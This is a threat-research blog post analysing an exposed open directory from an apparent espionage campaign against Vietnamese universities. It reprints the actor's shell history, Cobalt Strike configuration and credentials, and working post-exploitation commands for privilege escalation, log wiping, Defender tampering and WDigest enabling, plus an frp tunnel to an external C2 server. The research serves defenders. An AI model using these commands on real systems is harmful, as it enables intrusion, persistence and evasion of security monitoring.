---
title: "Example Blog"
classes: wide
header:
  teaser: /assets/images/china/raw.png
ribbon: black
description: "Infiltrating a suspected Chinese intellingence operation"
categories:
  - CTF Writeup
tags:
  - Threat Research
  - Malware Analysis
  - China
toc: true
---

# Open Directories

During malware execution chains or hands-on-keyboard intrusions, adversaries will often download additional malware or tooling on the fly, frequently using the HTTP protocol. Adversaries may achieve this by setting a simple Python HTTP server, `python -m http.server 80`, and then accessing the files via a regular HTTP request. 

Occasionally, when threat actors are hosting payloads over HTTP, they accidentally expose the whole entire directory and subdirectory of files, rather than the singular payload they intended to share. This can introduce a massive operational security failure for adversaries, as additional tooling, victim data, adversary credentials, and more, can be exposed. 

# Case Study

In some cases, like the one we will discuss, the OPSEC failure can be so **significant** that an entire *potential* espionage operation can be exposed, within a day. 

The research, found by [@xorJosh](https://x.com/xorJosh) and [@polygonben](https://x.com/polygonben), identified a Chinese threat actor that had successfully compromised at least 30 unique Vietnamese universities or educational facilities, many of which specialise in tech and engineering. This was identified via a singular open-directory that exposed massive amounts of sensitive threat actor data. This data did not suggest the threat actor was financially motivated, but rather they intended to persist in victim environments for long periods of time, gathering information. 

Evidence suggests the threat actor gained access to these organisations via exploitation of public facing vulnerabilities using *Metasploit*, uploading *Godzilla webshells*, or via *SQL injection*. Upon gaining a foothold, the adversary has been observed deploying Cobalt Strike beacons. Once the beacon is established, the actor has exploited local Windows vulnerabilities for privilege escalation and installed tunneling software for persistent remote access. 

Based on our observations and victimology, these tactics, techniques, and procedures (TTPs) show significant overlap with previously reported activity attributed to threat actor *Earth Lamia*, named by Trend Micro.

## .bash_history

When hunting for interesting open-directories, I always keep an eye out for the Linux `.bash_history` file. This can expose the commands run by an adversary on a Linux machine. It will reside in the user's home folder (e.g. `/home/ben/.bash_history`).

When we opened the [`.bash_history`](https://github.com/ctrlaltint3l/intelligence/blob/main/VietnameseCampaign/Artefacts/.bash_history) file on this host, we knew we were in for fun:

[![1](/assets/images/china/image2.png)](/assets/images/china/image2.png){: .full}


* Threat actor downloading Chinese language pack

```bash
apt-get install language-pack-zh-hans
```

* Threat actor generating certificates:

```bash
openssl pkcs12 -export -in server.pem -inkey server.key -out cfcert.p12 -name cloudflare_cert -passout pass:UPNV7J6rqSbc3Ay

keytool -importkeystore -deststorepass UPNV7J6rqSbc3Ay -destkeypass UPNV7J6rqSbc3Ay -destkeystore cfcert.store -srckeystore cfcert.p12 -srcstoretype PKCS12 -srcstorepass UPNV7J6rqSbc3Ay -alias cloudflare_cert
```

* Threat actor starting Cobalt Strike Teamserver

```bash
./teamserver 103.215.77.214 1234567890 jquery-c2.4.5.profile 
./teamserver 103.215.77.214 UPNV7J6rqSbc3Ay CDN.profile
```

* Threat actor configuring Fast Reverse Proxy (frp) server

```bash
./frps -c frps.toml
```

* We can see the frps.toml file has the below config:

```bash
bindPort = 4444
```

* Threat actor downloading Metasploit

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
```

Analysis of the `.bash_history` file reveals the threat actor installing relevant Chinese language packs, setting up and configuring a Cobalt Strike beacon server, installing tunneling software, and downloading Metasploit. From this alone, we cannot say, for definite, whether this is malicious adversarial commands or a potential red team that has a huge OPSEC failure.

However, we have identified evidence of a **modified** Cobalt Strike server on this box. Thankfully, exploring the open-directory, we can recover all relevant Cobalt Strike server data that reveals true intent. 

## Cobalt Strike

Cobalt Strike is a commercial red-team tool originally built for penetration testers. It provides features like beacon implants, post-exploitation modules, and C2 (command-and-control) management. While designed for defenders to simulate adversaries, cracked versions of Cobalt Strike have been heavily abused by cybercriminals and state-sponsored threat actors worldwide. It’s often used after initial access to move laterally, escalate privileges, and stage payloads.

We observed the threat actor leveraging an open-source modified and cracked Cobalt Strike client and server, "Cat Cobalt Strike (Kunkun Version)":

[![1](/assets/images/china/kunkun.png)](/assets/images/china/kunkun.png){: .full}

This modified client and server is advertised to have the following capabilities:

* Customised to bypass 360 Total Security  
* Google Two-Factor Authentication (2FA) for C2 Access - *not enabled by the TA*
* Fixes known vulnerability CVE-2022-39197


[![2](/assets/images/china/image4.png)](/assets/images/china/image4.png){: .full}

From a detailed analysis of all the logs, databases, downloads, and other files within this directory, we were able to identify:

* Full lists of victims workstations, their public IP addresses and in some cases credentials
  * We noticed many of these hostnames followed a regular naming scheme (e.g. JOSH-DC, JOSH-FILE, JOSH-SVR, …) indicating the threat actor had compromised multiple hosts within some organisations. 
* The IP addresses the Chinese individuals used to connect to the Cobalt Strike beacon server
* Configuration files and plain-text credentials
* Private certificates
* Commands and malware that were sent to victim machines for execution
* Sensitive data, including full back-end source code of a Vietnamese university portal, that was downloaded from victim workstations
* Interestingly, memory dumps from victim machines 


In order to retrieve the full Cobalt Strike beacon victim list, credentials, and commands ran on victim machines, we can view the below files that were left on the open-directory:

```bash
/CS/server/beacon.db
/CS/server/data/archives.bin
/CS/server/data/c2info.bin
/CS/server/data/listeners.bin
/CS/server/data/sessions.bin
/CS/server/data/targets.bin
```

From the `beacon.db` file, we were able to identify 63 unique workstations that have been infected with a Cobalt Strike beacon. The first registered beacon was the host `WIN-K65K8DF8FOD`, which was beaconing from the Chinese IP address ‘27.150.114[.]115’. This was a test host created by the threat actor, exposing the adversaries public IP address. 

The 62 registered beacons that followed this were all beaconing from various Cloudflare AS 13335 IP addresses. Why is this happening? We can look at the file [`/CS/server/CatServer.Properties`](https://github.com/ctrlaltint3l/intelligence/blob/main/VietnameseCampaign/CobaltStrike/CatServer.properties):

```
# ??????,????????.(?????????cs??,???????,?????TeamSever)
CatServer.Version = 2.16667
# TeamSever端口 
CatServer.port = 23456
# 证书路径
CatServer.store = cfcert.store
# 证书密码
CatServer.store-password = UPNV7J6rqSbc3Ay
# 保持127就行
CatServer.host = 127.0.0.1
# teamserver密码
CatServer.password = dsad2dffas1
CatServer.profile-name = cobaltstrike
# ???profile文件路径
CatServer.profile = CDN.profile

CatServer.auth = false
CatServer.authlog = false

#谷歌验证码配置 在微信小程序可直接获取 
CatServer.googleauth = false
CatServer.googlekey = YOTPPRZ4RQ75QNKKE65GXE6BQBSQDVQJ
CatServer.safecode = 123456

(Translated: Google verification code config — can be obtained directly via the WeChat mini-program)

# AES iv 
CatServer.Iv = abcdefghijklmnop

# stager配置 建议小改
stager.checksum-num = 400
stager.x86-num = 100
stager.x86-uri-len = 6
stager.x64-num = 105
stager.x64-uri-len = 8

```

The file `CatServer.Properties` is a configuration file for Cat Cobalt Strike Kun Kun that provides operational insight into how the teamserver was configured. Specifically, we can see the password for the teamserver being `dsad2dffas1` and the port it listening on being `23456`.

Additionally, we can see the file [`/CS/server/cfcert.store`](https://github.com/ctrlaltint3l/intelligence/blob/main/VietnameseCampaign/CobaltStrike/cfcert.store):

[![2](/assets/images/china/image3.png)](/assets/images/china/image3.png){: .full}

We can analyse the certificate and see it has been named `cloudflare_cert`. Additionally, we exposed how this certificate was generated from the `.bash_history` file:

```bash
openssl pkcs12 -export -in server.pem -inkey server.key -out cfcert.p12 -name cloudflare_cert -passout pass:UPNV7J6rqSbc3Ay

keytool -importkeystore -deststorepass UPNV7J6rqSbc3Ay -destkeypass UPNV7J6rqSbc3Ay -destkeystore cfcert.store -srckeystore cfcert.p12 -srcstoretype PKCS12 -srcstorepass UPNV7J6rqSbc3Ay -alias cloudflare_cert
```

Additionally, we can view the file [CDN.profile](https://github.com/ctrlaltint3l/intelligence/blob/main/VietnameseCampaign/CobaltStrike/CDN.profile), to receive further context into the CDN configuration:

```
https-certificate {
set keystore "cfcert.store";
set password "UPNV7J6rqSbc3Ay";
}
[...REDACTED…]
http-stager {
set uri_x86 "/api/1";
set uri_x64 "/api/2";
client {
header "Host" "micrcs.microsoft-defend.club";}
server {
output{
print;
}
[...REDACTED…]
```

From the above, we can see the domain `micrcs.microsoft-defend[.]club` is used for C2 communications. OSINT reveals this is hosted on Cloudflare. 

With all the other sensitive threat actor data, a malleable beacon profile was also included [`/CS/server/jquery-c2.4.5.profile`](https://github.com/ctrlaltint3l/intelligence/blob/main/VietnameseCampaign/CobaltStrike/jquery-c2.4.5.profile.bak):


```
set sample_name "jQuery CS 4.5 Profile";


set sleeptime "45000";         # 45 Seconds

set jitter    "37";            # % jitter
set data_jitter "100";          

set useragent "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";


https-certificate {
    

    set C   "US";
    set CN  "baidu.com";
    set O   "baidu";
    set OU  "baidu";
    set validity "365";
}


set tcp_port "42666";
set tcp_frame_header "\x80";


set pipename         "mojo.5688.8052.183894939787088877##"; # Common Chrome named pipe
set pipename_stager  "mojo.5688.8052.35780273329370473##"; # Common Chrome named pipe
set smb_frame_header "\x80";


dns-beacon {
    # Options moved into "dns-beacon" group in version 4.3
    set dns_idle           "74.125.196[.]113"; #google.com (change this to match your campaign)
    set dns_max_txt        "252";
    set dns_sleep          "0"; #    Force a sleep prior to each individual DNS request. (in milliseconds)
    set dns_ttl            "5";
    set maxdns             "255";
    set dns_stager_prepend ".resources.123456.";
    set dns_stager_subhost ".feeds.123456.";

    # DNS subhosts override options, added in version 4.3
    set beacon           "a.bc.";
    set get_A            "b.1a.";
    set get_AAAA         "c.4a.";
    set get_TXT          "d.tx.";
    set put_metadata     "e.md.";
    set put_output       "f.po.";
    set ns_response      "zero";

}
[...REDACTED...]
```

### Cobalt Strike Post-Exploitation

This threat actor appeared to use Cobalt Strike for persistence, privilege escalation, defence evasion, lateral movement and information harvesting. From Cobalt Strike logs, we were able to ascertain commands run and tooling executed by the threat actor: 

#### Misc

```
C:\ProgramData\mdm.txt
C:\ProgramData\1.txt
C:\ProgramData\GetCLSID.ps1
```

Likely staging files. GetCLSID.ps1 could be a script for enumerating COM CLSIDs or checking for hijack opportunities.

#### Discovery

`net user` - lists all user accounts
`systeminfo` - Displays OS version, build, hotfixes, domain info, uptime
`ipconfig /all` - Displays network config, IPs, etc
`netstat -ano | findstr :3389` - Looking for port 3389 (RDP)
`sc query TermService` - Checks status of Remote Desktop Services.
`%windir%/system32/inetsrv/appcmd list sites` - Lists all IIS websites configured on the host.

`for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr "TTL="q` - Ping sweep across 192.168.1.1 → 192.168.1.254 for live hosts.

`schtasks /query /tn "MaintainRDP"`

* Queries the scheduled task MaintainRDP (a persistence mechanism).

`reg query "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections`

* Checks if RDP connections are allowed (0 = allowed, 1 = denied).

`reg query "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber`

* Reads the configured RDP port (default 3389).


`netsh advfirewall firewall show rule name=all | findstr "443" `

* Looks for firewall rules mentioning port 443 (commonly abused to hide RDP or tunnels).

```bash
fscan.exe -h 192.168.1.1/24 -np -no -nopoc 
fscan.exe -h 192.168.1.1/24 - rf id_rsa.pub 
fscan.exe -h 192.168.1.1/24 - rs 192.168.1.1:6666 
fscan.exe -h 192.168.1.1/24 -c whoami fscan.exe - h 192.168.1.1/24 -m ssh -p 2222 
fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt 
fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt 
fscan.exe -h 192.168.1.1/8 
fscan.exe -h 192.168.1.1/24 -m smb -pwd password 
fscan.exe -h 192.168.1.1/24 -m ms17010 fscan.exe -hf ip.txt (# ####) 
fscan.exe -u http://baidu.com -proxy 8080 
fscan.exe -h 192.168.1.1/24 -nobr -nopoc 
fscan.exe -h 192.168.1.1/24 -pa 3389
```

* Using niche Chinese network enumeration tooling [fscan](https://github.com/shadow1ng/fscan)

#### Execution

```
C:\Users\Administrator\Desktop\shell\svhost.exe
C:\Users\<USERNAME>\Desktop\taskhost.exe
C:\winodws\taskhost.exe
```

* Masquerading as common Windows binaries

`C:\Windows\System32\spool\drivers
\color\e8i580ehei5a3.dll` - Likely malicious DLL

#### Persistence

```
net user IIS_USER Pass@123 /add
net user IIS_USER !@#qwe123admin /add
net user IIS_USER Aa123456@@@ /add
net user <USERNAME> Aa123456@@@q
net user nguyentuanh Tongtong@1890 /add /domain
net group "Domain Admins" nguyentuanh /add /domain
net localgroup administrators IIS_USER /add
```

* Creates multiple local/domain users with weak or common passwords.
* Adds `nguyentuanh` to Domain Admins.
* Adds `IIS_USER` to the local Administrators group.
* Ensures attackers can get back in even if initial access is cleaned up.

Scheduled task “MaintainRDP” that attempts to run the below command:

`C:\Users\IIS_USER\Documents\frpc.exe -c C:\Users\IIS_USER\Documents\frpc.toml`

This allows the adversary to tunnel RDP to their server. See “Command and Control” for more information.



#### Defence Evasion

```bash
auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable

auditpol /set /category:"Account Logon" /success:disable /failure:disable
```

* Disables auditing of logon events and credential use (removes visibility for defenders).

```bash
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f
```

* Changes RDP to run on port 443 (blends with HTTPS traffic).

```bash
sc.exe sdset WindowsDefend "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```

* Modifies the security descriptor of the Windows Defender service. Can block admins from controlling or stopping Defender, breaking security operations.

```bash
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

* Enables WDigest cleartext credential storage in memory (makes credential dumping easier).

```bash
netsh advfirewall firewall add rule name="Allow RDP (3389)" dir=in action=allow protocol=TCP localport=3389 remoteip=any profile=any enable=yes
```

* Adds a firewall rule to allow inbound RDP from any IP.

```bash
powershell -c "Add-MpPreference -ExclusionPath 'G:\<FILE_PATH>'
```

* Adds a Defender AV exclusion for the attacker’s file path (malware won’t be scanned there).

```bash
net stop "BkavService"
net stop "BkavSystemService
```

* Stops services of Bkav, a Vietnamese antivirus product.

```bash
Get-WinEvent -ListLog * | ForEach-Object { Clear-EventLog -LogName $_.LogName -ErrorAction SilentlyContinue }
Clear-EventLog -LogName System, Security, Application
```

* Attempts to wipe all Windows event logs.

#### Credential Access

```bash
DecryptTeamViewer.exe
``` 

* Red team tooling “to enumerate and decrypt TeamViewer credentials from Windows registry.” - https://github.com/V1V1/DecryptTeamViewer

#### Lateral Movement

```bash
SharpExec.exe -m=psexec -i=192.168.1.2 -u=ftp -p=abc@123v -d= -e=C:\Windows\System32\cmd.exe -c=”whoami”
```
#### Privilege Escalation

`C:\ProgramData\FFICreateAdminUser.exe` - The threat actor leveraged a open source tool developed by Tas9er to create new Administrator accounts

From the Cobalt Strike timelines, we were able to ascertain the threat actor attempted to exploit the below vulnerabilities. 

```
CVE-2024-30088, CVE-2023-28252, CVE-2020-0796, CVE-2023-36802, CVE-2018-8120, CVE-2017-0213, CVE-2022-24521, CVE-2021-36955, CVE-2021-1732, CVE-2022-24481, CVE-2023-23376, CVE-2022-35803, CVE-2021-43226, CVE-2024-35250, CVE-2024-26229, CVE-2024-21338, CVE-2021-1675, CVE-2021-40449

MS13-046, MS16-032, MS15-051
```

#### Command & Control

```bash
https://github.com/fatedier/frp/releases/download/v0.36.2/frp_0.36.2_windows_amd64.zip
( echo @echo off echo set COMPAT_LAYER=Win7RTM echo set __COMPAT_LAYER=Win7RTM echo frpc.exe -c frpc.toml ) > run_frpc.bat
type C:\ProgramData\frpc.toml
frpc.exe -c frpc.toml
```

* Threat actor leveraging FRP (Fast Reverse Proxy) client with a config `C:\ProgramData\frpc.toml`:

```
serverAddr = "103.215.77[.]214"
serverPort = 4444

[[proxies]]
name = "rdp7"
type = "tcp"
localPort = 3389
remotePort = 6008
```

The above FRP client will connect to the proxy on `103.215.77[.]214:4444` and tunnel its RDP service to port `6008`



